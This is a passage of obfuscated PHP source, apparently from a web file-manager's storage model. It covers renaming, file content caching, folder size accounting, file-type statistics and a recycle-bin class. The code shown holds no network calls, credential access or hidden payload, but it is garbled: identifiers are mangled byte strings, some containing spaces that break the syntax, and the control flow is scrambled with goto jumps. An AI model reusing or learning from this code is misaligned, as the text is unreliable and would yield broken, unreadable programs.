(!$Eôƒ¹Ê·Œ“[$CÌˆñ¸Òñå[383]] == $CÌˆñ¸Òñå[384]) { $eê‚¸“Ïò»[$CÌˆñ¸Òñå[397]] = get_path_ext($dÁñ’ é‘Ë); } Model($CÌˆñ¸Òñå[389])->eventRename($d´Ëß‚¼, $Eôƒ¹Ê·Œ“[$CÌˆñ¸Òñå[28]], $dÁñ’ é‘Ë); $this->sourceCacheClear($d´Ëß‚¼); goto DÇ¦‚áÍ‰; DÇ¦‚áÍ‰: $this->setNamePinyin($d´Ëß‚¼, $eê‚¸“Ïò»[$CÌˆñ¸Òñå[28]], !1); $this->updateModifyTime($Eôƒ¹Ê·Œ“[$CÌˆñ¸Òñå[392]]); return $this->where(array($CÌˆñ¸Òñå[423] => $d´Ëß‚¼))->data($eê‚¸“Ïò»)->save(); goto eÖğ¥ìÇ‚Ú; C¬ÑäÌÈŠ: $CÌˆñ¸Òñå =& $_SERVER[°Óó£ÌİóèÅ]; $Eôƒ¹Ê·Œ“ = $this->sourceInfo($d´Ëß‚¼); if (!$Eôƒ¹Ê·Œ“) { return !1; } goto fºÏÈÚ–; eÖğ¥ìÇ‚Ú: } public function setNamePinyin($cÊàìÛğœö, $Dù÷–³òÑò, $cğäøêŸ™µ = true) { $b©¼ªß§ó =& $_SERVER[°Óó£ÌİóèÅ]; $EÍ×Ì‚åéÆ = Input::check($Dù÷–³òÑò, $b©¼ªß§ó[411]); if ($cğäøêŸ™µ && !$EÍ×Ì‚åéÆ) { return; } if (!$EÍ×Ì‚åéÆ) { $this->metaSet($cÊàìÛğœö, $b©¼ªß§ó[412], null); $this->metaSet($cÊàìÛğœö, $b©¼ªß§ó[413], null); return; } $AêéÛŞö‚Ï = array($b©¼ªß§ó[412] => str_replace($b©¼ªß§ó[50], $b©¼ªß§ó[33], Pinyin::encode($Dù÷–³òÑò)), $b©¼ªß§ó[413] => Pinyin::encode($Dù÷–³òÑò, $b©¼ªß§ó[414])); $this->metaSet($cÊàìÛğœö, $AêéÛŞö‚Ï); } public function getContent($d¡ì¯† ŞŠ) { goto d¹‰–“„¹; d¹‰–“„¹: $fÉö²ŒŠöÍ =& $_SERVER[°Óó£ÌİóèÅ]; $F™ÀöÙºâÚ = $this->fileInfoGet($d¡ì¯† ŞŠ); if (!$F™ÀöÙºâÚ) { return !1; } goto E…•ßå‡¹; fÃº—¶ÖÑ¼: return IO::getContent($F™ÀöÙºâÚ[$fÉö²ŒŠöÍ[84]]); goto EÉ¸Ş…ñ‡‹; E…•ßå‡¹: if ($F™ÀöÙºâÚ[$fÉö²ŒŠöÍ[86]] == 0) { return $fÉö²ŒŠöÍ[33]; } $DÄ÷à»’ = $fÉö²ŒŠöÍ[1784] . $F™ÀöÙºâÚ[$fÉö²ŒŠöÍ[168]]; if ($F™ÀöÙºâÚ[$fÉö²ŒŠöÍ[86]] <= 1024 * 10) { $b§º²Ï“„‡ = Cache::get($DÄ÷à»’); if (!$b§º²Ï“„‡) { $b§º²Ï“„‡ = IO::getContent($F™ÀöÙºâÚ[$fÉö²ŒŠöÍ[84]]); Cache::set($DÄ÷à»’, $b§º²Ï“„‡); } return $b§º²Ï“„‡; } goto fÃº—¶ÖÑ¼; EÉ¸Ş…ñ‡‹: } public function setDesc($càÑÄŒ‹ÏÁ, $bªõÙ˜Œ„ˆ) { $C¥òêåğ =& $_SERVER[°Óó£ÌİóèÅ]; Model($C¥òêåğ[389])->eventAddDesc($càÑÄŒ‹ÏÁ, $bªõÙ˜Œ„ˆ); return $this->metaSet($càÑÄŒ‹ÏÁ, $C¥òêåğ[1590], $bªõÙ˜Œ„ˆ); } public function setContent($c³ò¤ ´ÅÔ, $däŸ†Ó‰Ñ = '') { goto A¼«®Áë”; fÇ©µ†°¨: $d£¶ù¶ŠÙŠ = $this->fileHistory($FôåéÔ‰êŒ, $AÏ»®Ö¸ö[$D”•§³­Ì[390]], $AÏ»®Ö¸ö[$D”•§³­Ì[86]]); if (!$d£¶ù¶ŠÙŠ) { return Model($D”•§³­Ì[419])->remove($AÏ»®Ö¸ö[$D”•§³­Ì[390]]); } $this->folderSizeReset($FôåéÔ‰êŒ[$D”•§³­Ì[392]]); goto e¸Û÷È„àÑ; e¸Û÷È„àÑ: return !0; goto d À‰ÙØ¦½; A¼«®Áë”: $D”•§³­Ì =& $_SERVER[°Óó£ÌİóèÅ]; $FôåéÔ‰êŒ = $this->sourceInfo($c³ò¤ ´ÅÔ); $BÕåÍ¾ôÃ‡ = $this->fileInfoGet($c³ò¤ ´ÅÔ); goto AØéÍ°·¡Š; AØéÍ°·¡Š: if (!$BÕåÍ¾ôÃ‡ || !$FôåéÔ‰êŒ) { return !1; } $this->checkLock($c³ò¤ ´ÅÔ); $AÏ»®Ö¸ö = Model($D”•§³­Ì[419])->addFileByContent($däŸ†Ó‰Ñ, $FôåéÔ‰êŒ[$D”•§³­Ì[28]]); goto fÇ©µ†°¨; d À‰ÙØ¦½: } public function fileSubstr($dœ–ë„Ä‹Î, $b¥ƒ¢†ÃâÎ, $C°°éŒ£Ûœ) { $eçŸõ±ö¶ = $this->fileInfoGet($dœ–ë„Ä‹Î); if (!$eçŸõ±ö¶) { return !1; } return IO::fileSubstr($eçŸõ±ö¶[$_SERVER[°Óó£ÌİóèÅ][84]], $b¥ƒ¢†ÃâÎ, $C°°éŒ£Ûœ); } public function fileInfoGet($Dí©Ÿ‡®Ê) { $E¤Éæ¨»Õ =& $_SERVER[°Óó£ÌİóèÅ]; $cŠ¬Şá˜íÃ = $this->sourceInfo($Dí©Ÿ‡®Ê); if (!$cŠ¬Şá˜íÃ || $cŠ¬Şá˜íÃ[$E¤Éæ¨»Õ[383]]) { return !1; } $Dğ—‚Ü›² = Model($E¤Éæ¨»Õ[419])->fileInfo($cŠ¬Şá˜íÃ[$E¤Éæ¨»Õ[390]]); if ($Dğ—‚Ü›²) { $Dğ—‚Ü›²[$E¤Éæ¨»Õ[28]] = $cŠ¬Şá˜íÃ[$E¤Éæ¨»Õ[28]]; } return $Dğ—‚Ü›²; } private function folderChildrenNumber($AÍÎßÓ‡øÕ) { $eµ®Ø’»Ÿ¥ =& $_SERVER[°Óó£ÌİóèÅ]; $aÆ¹é„”Ü = $this->sourceInfo($AÍÎßÓ‡øÕ); $aˆçÀØìŞŒ = array($eµ®Ø’»Ÿ¥[407] => array($eµ®Ø’»Ÿ¥[416], $aÆ¹é„”Ü[$eµ®Ø’»Ÿ¥[381]] . $AÍÎßÓ‡øÕ . $eµ®Ø’»Ÿ¥[417]), $eµ®Ø’»Ÿ¥[408] => 0, $eµ®Ø’»Ÿ¥[394] => 1); $bê¿´Ëœğ· = $this->where($aˆçÀØìŞŒ)->count(); $c—ï¥Êé®­ = $this->where($aˆçÀØìŞŒ)->where(array($eµ®Ø’»Ÿ¥[394] => 0))->count(); return array($eµ®Ø’»Ÿ¥[90] => $c—ï¥Êé®­, $eµ®Ø’»Ÿ¥[91] => $bê¿´Ëœğ·); } public static $cachePathInfo = array(); public function pathInfo($B¯¯÷ó¿‘, $bŠœµÀÆŒ = false) { goto C øÍê„å ; bÈÇ‹Ã”ª: $Bƒ“ŒËİ– = $this->sourceInfo($B¯¯÷ó¿‘); if (!$Bƒ“ŒËİ–) { return !1; } $Bƒ“ŒËİ– = $this->_listDataApplyItem($Bƒ“ŒËİ–, $bŠœµÀÆŒ); goto DÇ£ê¡¦†Ò; DÇ£ê¡¦†Ò: self::$cachePathInfo[$C÷‘À¦±†] = $Bƒ“ŒËİ–; return $Bƒ“ŒËİ–; goto aÜ×ÍŒÙÌ’; C øÍê„å : $C÷‘À¦±† = $B¯¯÷ó¿‘ . $_SERVER[°Óó£ÌİóèÅ][506] . intval($bŠœµÀÆŒ); $aÃ÷‚±ªò˜ = _get(self::$cachePathInfo, $C÷‘À¦±†); if ($aÃ÷‚±ªò˜) { return $aÃ÷‚±ªò˜; } goto bÈÇ‹Ã”ª; aÜ×ÍŒÙÌ’: } public static $cachePathInfoMore = array(); public function pathInfoMore($e›ã‰Ú¢Œ”) { goto Eåªëª¤…ñ; Eåªëª¤…ñ: $AÛÌ¢öëÜ‹ =& $_SERVER[°Óó£ÌİóèÅ]; $Bšóã£ˆéÃ = _get(self::$cachePathInfoMore, $e›ã‰Ú¢Œ”); if ($Bšóã£ˆéÃ) { return $Bšóã£ˆéÃ; } goto fá¬Äï’’Ü; A¯ñ½Ô æ†: self::$cachePathInfoMore[$e›ã‰Ú¢Œ”] = $c óŒ·®—…; return $c óŒ·®—…; goto a»œ×«‚ßÏ; fá¬Äï’’Ü: $c óŒ·®—… = $this->pathInfo($e›ã‰Ú¢Œ”); if (!$c óŒ·®—…) { return !1; } if ($c óŒ·®—…[$AÛÌ¢öëÜ‹[383]] == $AÛÌ¢öëÜ‹[384]) { $c óŒ·®—…[$AÛÌ¢öëÜ‹[89]] = $this->folderChildrenNumber($e›ã‰Ú¢Œ”); } else { $c óŒ·®—…[$AÛÌ¢öëÜ‹[167]] = $this->fileInfoGet($e›ã‰Ú¢Œ”); unset($c óŒ·®—…[$AÛÌ¢öëÜ‹[167]][$AÛÌ¢öëÜ‹[84]]); } goto A¯ñ½Ô æ†; a»œ×«‚ßÏ: } public function sourceInfo($eàƒ¯ÄÖå) { $A»‰ÀŒ‚ù° =& $_SERVER[°Óó£ÌİóèÅ]; $d‡ô—õÓõ = $A»‰ÀŒ‚ù°[1785] . $eàƒ¯ÄÖå; $E½è°ˆô»‘ = _get(self::$cacheSourceInfo, $d‡ô—õÓõ); if ($E½è°ˆô»‘) { return $E½è°ˆô»‘; } self::$cacheSourceInfo[$d‡ô—õÓõ] = $this->where(array($A»‰ÀŒ‚ù°[382] => $eàƒ¯ÄÖå))->find(); return self::$cacheSourceInfo[$d‡ô—õÓõ]; } public function sourceCacheClear($D‡å¯£ì = false) { if ($D‡å¯£ì == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[°Óó£ÌİóèÅ][1785] . $D‡å¯£ì]); } public function pathInfoByPath($DÉ†…ñ©–‡, $bº‡àëÀ˜) { $e©¥…ñô¼º =& $_SERVER[°Óó£ÌİóèÅ]; $bƒ£Ş“¶¯Û = !$bº‡àëÀ˜ ? array() : explode($e©¥…ñô¼º[8], trim($bº‡àëÀ˜, $e©¥…ñô¼º[8])); $B÷§²—ñ¹ = $DÉ†…ñ©–‡; foreach ($bƒ£Ş“¶¯Û as $fİ®‰·»Á) { $EêÇÍ§·ŠÏ = array($e©¥…ñô¼º[392] => $B÷§²—ñ¹, $e©¥…ñô¼º[28] => $fİ®‰·»Á); $DŒä³À„©Œ = $this->where($EêÇÍ§·ŠÏ)->select(); if (!$DŒä³À„©Œ) { return !1; } $DŒä³À„©Œ = array_sort_by($DŒä³À„©Œ, $e©¥…ñô¼º[418]); $B÷§²—ñ¹ = $DŒä³À„©Œ[0][$e©¥…ñô¼º[382]]; } return $this->pathInfo($B÷§²—ñ¹, !0); } protected function updateModifyTime($bÚÊ¨ˆ¤´) { goto bÅ‘Øã… ƒ; aà»Ó¼ªÀƒ: $this->where($dÚåªØ£«)->save($CĞä®½Š‡İ); goto bİóĞŸŞĞ‰; bÅ‘Øã… ƒ: $fÄÅ¼ò®™ˆ =& $_SERVER[°Óó£ÌİóèÅ]; if (!$bÚÊ¨ˆ¤´) { return; } if (!is_array($bÚÊ¨ˆ¤´)) { $bÚÊ¨ˆ¤´ = array($bÚÊ¨ˆ¤´); } goto b‚Ô‘ö¢š£; b‚Ô‘ö¢š£: foreach ($bÚÊ¨ˆ¤´ as $Bâ„êÌ½Š´ => $B‰°¶¹ÅÃì) { $bÚÊ¨ˆ¤´[$Bâ„êÌ½Š´] = intval($B‰°¶¹ÅÃì); } $dÚåªØ£« = array($fÄÅ¼ò®™ˆ[382] => array($fÄÅ¼ò®™ˆ[7], $bÚÊ¨ˆ¤´)); $CĞä®½Š‡İ = array($fÄÅ¼ò®™ˆ[405] => USER_ID, $fÄÅ¼ò®™ˆ[1768] => time()); goto aà»Ó¼ªÀƒ; bİóĞŸŞĞ‰: } public function folderSizeReset($e£¼ï¸äªæ) { goto AŞ½ŸÙ×‘ö; f¥ŒâÅÛ¿ï: $fÓâäŞ“ = $eŒäŸœ¯Ú¿ - intval($eİ‡À¹‘ê[$dÑÁÓµ—“â[86]]); if ($fÓâäŞ“ == 0) { return CacheLock::unlock($EëÌ¯İ¢†); } $this->where(array($dÑÁÓµ—“â[423] => $e£¼ï¸äªæ))->setField($dÑÁÓµ—“â[86], $eŒäŸœ¯Ú¿); goto A¤çíÕ´âè; E‹İùô‘Íù: CacheLock::unlock($EëÌ¯İ¢†); goto Eµƒ·áËéƒ; B‘¸Ä²³£ç: CacheLock::lock($EëÌ¯İ¢†, 20); $this->sourceCacheClear($e£¼ï¸äªæ); $eİ‡À¹‘ê = $this->sourceInfo($e£¼ï¸äªæ); goto C‰ÅÂ¨š–ˆ; C‰ÅÂ¨š–ˆ: $E³Î¦Í…„ = array($dÑÁÓµ—“â[406] => $e£¼ï¸äªæ, $dÑÁÓµ—“â[408] => 0); $eŒäŸœ¯Ú¿ = $this->where($E³Î¦Í…„)->sum($dÑÁÓµ—“â[86]); $eŒäŸœ¯Ú¿ = intval($eŒäŸœ¯Ú¿); goto f¥ŒâÅÛ¿ï; A¤çíÕ´âè: $cª—îêÆÀã = $this->parentLevelArray($eİ‡À¹‘ê[$dÑÁÓµ—“â[381]]); if ($cª—îêÆÀã) { $E³Î¦Í…„ = array($dÑÁÓµ—“â[382] => array($dÑÁÓµ—“â[563], $cª—îêÆÀã)); $this->where($E³Î¦Í…„)->setAdd($dÑÁÓµ—“â[86], $fÓâäŞ“); } $this->targetSpaceUpdate($eİ‡À¹‘ê[$dÑÁÓµ—“â[401]], $eİ‡À¹‘ê[$dÑÁÓµ—“â[403]]); goto E‹İùô‘Íù; AŞ½ŸÙ×‘ö: $dÑÁÓµ—“â =& $_SERVER[°Óó£ÌİóèÅ]; if ($this->statusIgnoreResetSpace) { return; } $EëÌ¯İ¢† = $dÑÁÓµ—“â[1786] . $e£¼ï¸äªæ; goto B‘¸Ä²³£ç; Eµƒ·áËéƒ: } public function folderSizeResetChildren($a—éæ¸î—) { goto e§±ï•ëŒå; e”é„ÚÂå: foreach ($D‰ãˆëº£Ï as $dªµæàÁ¶) { $cìÓ˜¼•‰ = $dªµæàÁ¶[$EÒŠáíŠÔõ[392]] . $EÒŠáíŠÔõ[33]; if (!isset($E¥‡Ò¶‰ğë[$cìÓ˜¼•‰])) { continue; } if ($dªµæàÁ¶[$EÒŠáíŠÔõ[418]] == $E¥‡Ò¶‰ğë[$cìÓ˜¼•‰][$EÒŠáíŠÔõ[418]]) { $E¥‡Ò¶‰ğë[$cìÓ˜¼•‰][$EÒŠáíŠÔõ[86]] += $dªµæàÁ¶[$EÒŠáíŠÔõ[86]]; } } foreach ($E¥‡Ò¶‰ğë as $dªµæàÁ¶) { $a°İ‘˜¥¡ = $this->parentLevelArray($dªµæàÁ¶[$EÒŠáíŠÔõ[381]]); foreach ($a°İ‘˜¥¡ as $cìÓ˜¼•‰) { $cìÓ˜¼•‰ = $cìÓ˜¼•‰ . $EÒŠáíŠÔõ[33]; if (!isset($E¥‡Ò¶‰ğë[$cìÓ˜¼•‰])) { continue; } if ($dªµæàÁ¶[$EÒŠáíŠÔõ[418]] == $E¥‡Ò¶‰ğë[$cìÓ˜¼•‰][$EÒŠáíŠÔõ[418]]) { $E¥‡Ò¶‰ğë[$cìÓ˜¼•‰][$EÒŠáíŠÔõ[86]] += $dªµæàÁ¶[$EÒŠáíŠÔõ[86]]; } } } $B•ÖÄ’ºŠ = array(); goto b¡ŒîËßã; b¡ŒîËßã: foreach ($E¥‡Ò¶‰ğë as $dªµæàÁ¶) { if ($dªµæàÁ¶[$EÒŠáíŠÔõ[86]] == $dªµæàÁ¶[$EÒŠáíŠÔõ[1788]]) { continue; } $B•ÖÄ’ºŠ[] = array($EÒŠáíŠÔõ[382], $dªµæàÁ¶[$EÒŠáíŠÔõ[382]], $EÒŠáíŠÔõ[86], $dªµæàÁ¶[$EÒŠáíŠÔõ[86]]); } $this->saveAll($B•ÖÄ’ºŠ); goto C‡½£Âßä; Eù¬ñïÀîÇ: $E¥‡Ò¶‰ğë[] = $B«Âƒà²†; $E¥‡Ò¶‰ğë = array_to_keyvalue($E¥‡Ò¶‰ğë, $EÒŠáíŠÔõ[382]); foreach ($E¥‡Ò¶‰ğë as $B¢Œˆ±–¾† => $dªµæàÁ¶) { $E¥‡Ò¶‰ğë[$B¢Œˆ±–¾†][$EÒŠáíŠÔõ[1788]] = $E¥‡Ò¶‰ğë[$B¢Œˆ±–¾†][$EÒŠáíŠÔõ[86]]; $E¥‡Ò¶‰ğë[$B¢Œˆ±–¾†][$EÒŠáíŠÔõ[86]] = 0; } goto e”é„ÚÂå; eôÍÜÅÍƒ†: $e÷ˆ§Ø‚‡‹[$EÒŠáíŠÔõ[383]] = 0; $D‰ãˆëº£Ï = $this->field($fºò¬ˆğäì)->where($e÷ˆ§Ø‚‡‹)->select(); if (!$D‰ãˆëº£Ï) { return; } goto Eù¬ñïÀîÇ; e§±ï•ëŒå: $EÒŠáíŠÔõ =& $_SERVER[°Óó£ÌİóèÅ]; $this->sourceCacheClear($a—éæ¸î—); $B«Âƒà²† = $this->sourceInfo($a—éæ¸î—); goto Açñºîóø; Açñºîóø: $e÷ˆ§Ø‚‡‹ = array($EÒŠáíŠÔõ[394] => 1, $EÒŠáíŠÔõ[407] => array($EÒŠáíŠÔõ[416], $B«Âƒà²†[$EÒŠáíŠÔõ[381]] . $a—éæ¸î— . $EÒŠáíŠÔõ[417])); $fºò¬ˆğäì = $EÒŠáíŠÔõ[1787]; $E¥‡Ò¶‰ğë = $this->field($fºò¬ˆğäì)->where($e÷ˆ§Ø‚‡‹)->select(); goto eôÍÜÅÍƒ†; C‡½£Âßä: } public function targetSpaceUpdate($bÇí¡”ƒÏ, $e†Ş®ì§‹ã) { $B­Ù‘»õÒ =& $_SERVER[°Óó£ÌİóèÅ]; if (!in_array($bÇí¡”ƒÏ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Cëì¥ñÚĞ = $this->targetSpaceSize($bÇí¡”ƒÏ, $e†Ş®ì§‹ã); if ($bÇí¡”ƒÏ == self::TYPE_USER) { Model($B­Ù‘»õÒ[1716])->userEdit($e†Ş®ì§‹ã, array($B­Ù‘»õÒ[1532] => $Cëì¥ñÚĞ)); } else { if ($bÇí¡”ƒÏ == self::TYPE_GROUP) { Model($B­Ù‘»õÒ[1710])->groupEdit($e†Ş®ì§‹ã, array($B­Ù‘»õÒ[1532] => $Cëì¥ñÚĞ)); } } } public function targetSpaceSize($cÖ©Í›ÅÂ‡, $côğ£Î¬§Ñ) { goto eÚ…Â®²âó; eÚ…Â®²âó: $cËğ„çêÉ =& $_SERVER[°Óó£ÌİóèÅ]; $d†à÷õ‘Õ² = $this->sourceRoot($cÖ©Í›ÅÂ‡, $côğ£Î¬§Ñ, !0); if (!$d†à÷õ‘Õ²) { return 0; } goto B°®³‹­Á; B°®³‹­Á: $C¿š§£äÎñ = floatval($d†à÷õ‘Õ²[$cËğ„çêÉ[86]]); $DÃï‡×Ã = array($cËğ„çêÉ[407] => array($cËğ„çêÉ[416], $cËğ„çêÉ[1626] . $d†à÷õ‘Õ²[$cËğ„çêÉ[382]] . $cËğ„çêÉ[1741])); $d‚ÁŒÉ‰»¤ = Model($cËğ„çêÉ[1789])->field($cËğ„çêÉ[423])->where($DÃï‡×Ã)->select(); goto fîŒ“±ˆ§ˆ; fîŒ“±ˆ§ˆ: $d‚ÁŒÉ‰»¤ = array_to_keyvalue($d‚ÁŒÉ‰»¤, $cËğ„çêÉ[33], $cËğ„çêÉ[382]); if ($d‚ÁŒÉ‰»¤) { $DÃï‡×Ã = array($cËğ„çêÉ[423] => array($cËğ„çêÉ[563], $d‚ÁŒÉ‰»¤)); $C¿š§£äÎñ += floatval($this->where($DÃï‡×Ã)->sum($cËğ„çêÉ[86])); } return $C¿š§£äÎñ; goto Aïõˆ­ù; Aïõˆ­ù: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($D‹Ô°ÚêİØ) { return $this->fileTypeProfile($D‹Ô°ÚêİØ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($BôŠ´Ëï‚) { return $this->fileTypeProfile($BôŠ´Ëï‚, SourceModel::TYPE_GROUP); } private function fileTypeProfile($FòòÚ£Šê, $Fƒ£ÄôÒàª) { goto DèòêÆšÚ; eµ¨ËĞ¯Ö: if ($cÆ¹ò¥ ë×) { return $cÆ¹ò¥ ë×; } $aø–é°‰ŞÛ = array($AĞªè¬™·¢[394] => 0); if ($FòòÚ£Šê != !1) { $aø–é°‰ŞÛ[$AĞªè¬™·¢[403]] = $FòòÚ£Šê; $aø–é°‰ŞÛ[$AĞªè¬™·¢[401]] = $Fƒ£ÄôÒàª; } goto aØø³Á‚; aØø³Á‚: $Fä¬³¸Ôá£ = array(); $Fä¬³¸Ôá£[$AĞªè¬™·¢[1791]] = array($AĞªè¬™·¢[1792] => LNG($AĞªè¬™·¢[1791]), $AĞªè¬™·¢[1793] => $this->where($aø–é°‰ŞÛ)->count(), $AĞªè¬™·¢[399] => $this->where($aø–é°‰ŞÛ)->sum($AĞªè¬™·¢[86])); $B—£ÖâáÑ = KodIO::fileTypeList(); goto DÖÎÎ¿·; DÖÎÎ¿·: foreach ($B—£ÖâáÑ as $EÁµ’…˜¾ˆ => $f°¡”‘ßœß) { $aø–é°‰ŞÛ[$AĞªè¬™·¢[397]] = $this->fileTypeWhere($EÁµ’…˜¾ˆ); $Fä¬³¸Ôá£[$EÁµ’…˜¾ˆ] = array($AĞªè¬™·¢[1792] => $f°¡”‘ßœß[$AĞªè¬™·¢[28]], $AĞªè¬™·¢[1793] => $this->where($aø–é°‰ŞÛ)->count(), $AĞªè¬™·¢[399] => $this->where($aø–é°‰ŞÛ)->sum($AĞªè¬™·¢[86])); } Cache::set($aÅ©åÒ Äğ, $Fä¬³¸Ôá£, 1200); return $Fä¬³¸Ôá£; goto EÏ×óè”©¼; DèòêÆšÚ: $AĞªè¬™·¢ =& $_SERVER[°Óó£ÌİóèÅ]; $aÅ©åÒ Äğ = $AĞªè¬™·¢[1790] . $FòòÚ£Šê . $AĞªè¬™·¢[79] . $Fƒ£ÄôÒàª; $cÆ¹ò¥ ë× = Cache::get($aÅ©åÒ Äğ); goto eµ¨ËĞ¯Ö; EÏ×óè”©¼: } public function fileNameExist($E¢Ä½ïàŠ», $aÌ£¥ÇòÛÕ) { $bµ´Å¬ŸŞà =& $_SERVER[°Óó£ÌİóèÅ]; $e†°…±†Ô° = $this->childList($E¢Ä½ïàŠ»); foreach ($e†°…±†Ô° as $cÚ®Õ×Û†Ÿ) { if ($cÚ®Õ×Û†Ÿ[$bµ´Å¬ŸŞà[28]] == $aÌ£¥ÇòÛÕ) { return $cÚ®Õ×Û†Ÿ[$bµ´Å¬ŸŞà[382]]; } } return !1; } public function childList($DÃ”ÕëäÖÇ) { $F¥ßÎ’ƒ =& $_SERVER[°Óó£ÌİóèÅ]; $E½Û¤Çöè = array($F¥ßÎ’ƒ[392] => intval($DÃ”ÕëäÖÇ), $F¥ßÎ’ƒ[418] => 0); $eà›çÕÓ­ = $this->cacheMemory()->where($E½Û¤Çöè)->select(); $eà›çÕÓ­ = $eà›çÕÓ­ ? $eà›çÕÓ­ : array(); foreach ($eà›çÕÓ­ as $fòˆ¥·§Ó§) { $Aí……¡òÇÌ = $F¥ßÎ’ƒ[1785] . $fòˆ¥·§Ó§[$F¥ßÎ’ƒ[382]]; self::$cacheSourceInfo[$Aí……¡òÇÌ] = $fòˆ¥·§Ó§; } return $eà›çÕÓ­; } public function fileNameAuto($f°âÎ¹Á’, $bÁÁ÷ãéÅ, $CØÆ‰ˆŠÇ = REPEAT_RENAME, $E…İööø™Ö = false) { $bÏ•é˜ó¤ä =& $_SERVER[°Óó£ÌİóèÅ]; $cÀ‹¿ÇÖ´© = $this->childList($f°âÎ¹Á’); $DÇçº–¸Á… = array_to_keyvalue($cÀ‹¿ÇÖ´©, $bÏ•é˜ó¤ä[33], $bÏ•é˜ó¤ä[28]); return $this->fileNameAutoGet($DÇçº–¸Á…, $bÁÁ÷ãéÅ, $CØÆ‰ˆŠÇ, $E…İööø™Ö); } public function fileNameAutoGet($F§é¯ªÑ–, $D…äÜÙĞ¿Ì, $Cºé¬ˆÓ¶Š, $BÔæÊ‘’¯ô) { $Eß•İ‹ô×¤ =& $_SERVER[°Óó£ÌİóèÅ]; if ($Cºé¬ˆÓ¶Š == REPEAT_REPLACE || !$F§é¯ªÑ– || !in_array_not_case($D…äÜÙĞ¿Ì, $F§é¯ªÑ–) || $BÔæÊ‘’¯ô && $Cºé¬ˆÓ¶Š != REPEAT_RENAME_FOLDER) { return $D…äÜÙĞ¿Ì; } if ($Cºé¬ˆÓ¶Š == REPEAT_SKIP) { return !1; } $f‚÷’æÚî‹ = $Eß•İ‹ô×¤[100] . get_path_ext($D…äÜÙĞ¿Ì); $f‚÷’æÚî‹ = $f‚÷’æÚî‹ == $Eß•İ‹ô×¤[100] || $BÔæÊ‘’¯ô ? $Eß•İ‹ô×¤[33] : $f‚÷’æÚî‹; for ($cÎ’óÖî¶í = 1; $cÎ’óÖî¶í <= count($F§é¯ªÑ–) + 1; $cÎ’óÖî¶í++) { $a‚éÑî²ß¢ = substr($D…äÜÙĞ¿Ì, 0, strlen($D…äÜÙĞ¿Ì) - strlen($f‚÷’æÚî‹)); $D·Ş‡Éƒõ™ = $a‚éÑî²ß¢ . "\x28{$cÎ’óÖî¶í}\51{$f‚÷’æÚî‹}"; if (!in_array_not_case($D·Ş‡Éƒõ™, $F§é¯ªÑ–)) { return $D·Ş‡Éƒõ™; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\x75\162\x63\145\137\x72\145\143\171\143\154\145"; protected $dataAuto = array(array("\x63\162\x65\x61\164\x65\x54\x69\x6d\x65", "\164\x69\x6d\145", "\x69\x6e\x73\145\x72\164", "\x66\x75\x6e\143\164\x69\157\x6e")); public function listData($D‘¢É‡£  = false) { $f÷ÃÎ°ŒÛ¼ =& $_SERVER[°Óó£ÌİóèÅ]; $D‘¢É‡£  = $D‘¢É‡£  ? $D‘¢É‡£  : USER_ID; $c·´˜ùÎŸ¤ = $this->where(array($f÷ÃÎ°ŒÛ¼[1086] => $D‘¢É‡£ ))->select(); return array_to_keyvalue($c·´˜ùÎŸ¤, $f÷ÃÎ°ŒÛ¼[33], $f÷ÃÎ°ŒÛ¼[382]); } public function moveToRecycle($C³»£Ò‘à°) { goto fğŸ•¶Šæ; fğŸ•¶Šæ: $E—Ã·™ë¢› =& $_SERVER[°Óó£ÌİóèÅ]; $DÏáÕğá¼Æ = Model($E—Ã·™ë¢›[852]); $CÖŸğ‘¾‘å = $DÏáÕğá¼Æ->sourceInfo($C³»£Ò‘à°); goto eêÊÜéÓèì; e©è°İ´¥Ñ: $this->recycleMove($C³»£Ò‘à°, 1); if ($CÖŸğ‘¾‘å[$E—Ã·™ë¢›[383]] == $E—Ã·™ë¢›[384]) { $C¬…˜ËÃ‚ = array($E—Ã·™ë¢›[407] => array($E—Ã·™ë¢›[416], $CÖŸğ‘¾‘å[$E—Ã·™ë¢›[381]] . $C³»£Ò‘à° . $E—Ã·™ë¢›[417])); $DÏáÕğá¼Æ->where($C¬…˜ËÃ‚)->setField($E—Ã·™ë¢›[418], 1); } goto bœ¯òŒÀ®; eêÊÜéÓèì: if (!$CÖŸğ‘¾‘å || $CÖŸğ‘¾‘å[$E—Ã·™ë¢›[418]] == $E—Ã·™ë¢›[384]) { return; } $cœëäÄÎª¡ = array($E—Ã·™ë¢›[423] => $C³»£Ò‘à°, $E—Ã·™ë¢›[1086] => USER_ID, $E—Ã·™ë¢›[400] => $CÖŸğ‘¾‘å[$E—Ã·™ë¢›[401]], $E—Ã·™ë¢›[402] => $CÖŸğ‘¾‘å[$E—Ã·™ë¢›[403]], $E—Ã·™ë¢›[407] => $CÖŸğ‘¾‘å[$E—Ã·™ë¢›[381]]); $this->add($cœëäÄÎª¡); goto e©è°İ´¥Ñ; bœ¯òŒÀ®: } public function clear() { $this->remove(!1); } public function remove($FÓí»èó° = false) { goto EÚß‹°Î˜ø; DÁ’¿ò®º: foreach ($B”ÖßìÏ¯™ as $EÈß™ Î–) { $FêİÃ‘Ê•ö->targetSpaceUpdate($EÈß™ Î–[$BŞƒ„À±á™[401]], $EÈß™ Î–[$BŞƒ„À±á™[403]]); } goto A‡‰Ççºä; EÚß‹°Î˜ø: $BŞƒ„À±á™ =& $_SERVER[°Óó£ÌİóèÅ]; $FêİÃ‘Ê•ö = Model($BŞƒ„À±á™[852]); $AÁÔ¯ â = $this->listData(); goto a¤ ¿¤¡¬¶; a¤ ¿¤¡¬¶: $FÓí»èó° = $FÓí»èó° === !1 ? !1 : $FÓí»èó°; $B”ÖßìÏ¯™ = array(); foreach ($AÁÔ¯ â as $e¶ÉÆƒÃê) { if ($FÓí»èó° != !1 && !in_array($e¶ÉÆƒÃê, $FÓí»èó°)) { continue; } $c‰¯àğïÜ¬ = $this->where(array($BŞƒ„À±á™[382] => $e¶ÉÆƒÃê))->find(); $aÔí±ŸŠ¡Ø = $c‰¯àğïÜ¬[$BŞƒ„À±á™[401]] . $BŞƒ„À±á™[79] . $c‰¯àğïÜ¬[$BŞƒ„À±á™[403]]; $B”ÖßìÏ¯™[$aÔí±ŸŠ¡Ø] = array($BŞƒ„À±á™[400] => $c‰¯àğïÜ¬[$BŞƒ„À±á™[401]], 